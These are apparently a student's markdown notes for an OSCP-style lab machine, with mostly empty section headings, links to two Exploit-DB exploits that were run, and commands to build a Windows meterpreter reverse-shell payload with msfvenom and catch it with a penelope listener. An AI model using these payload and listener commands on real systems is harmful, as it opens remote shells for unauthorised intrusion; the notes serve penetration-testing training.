# Service Discovery

## Open Ports & Priority


# Service Enumeration

![[Pasted image 20260711195754.png]]

Googled, found https://www.exploit-db.com/exploits/46697 

Ran with python2, got success:

![[Pasted image 20260712111055.png]]



Download https://www.exploit-db.com/exploits/49601

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.169 LPORT=445 -f exe -o reverse.exe`

`penelope -p 445 -O`




# Initial Access

# Privilege Escalation

# Proof Screenshots (local.txt / proof.txt)
`type` or `cat` flag and [include IP address in screenshot](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#screenshot-requirements)